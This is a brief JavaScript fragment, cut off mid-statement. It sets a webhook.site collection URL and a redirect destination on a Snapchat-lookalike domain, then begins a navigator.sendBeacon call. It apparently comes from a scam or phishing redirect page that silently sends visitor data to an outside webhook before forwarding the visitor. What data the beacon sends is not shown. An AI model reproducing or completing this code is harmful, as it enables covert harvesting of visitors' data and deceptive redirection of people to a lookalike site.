    const WEBHOOK_URL = "https://webhook.site/55b80994-a2c4-4b3f-a87d-731c6e91d0d1";

    // Your final Forms.app link
    const DESTINATION = "https://c.snapchat.dating/2341";

    try {
      if (navigator.sendBeacon) {
        const blob = new Blob(
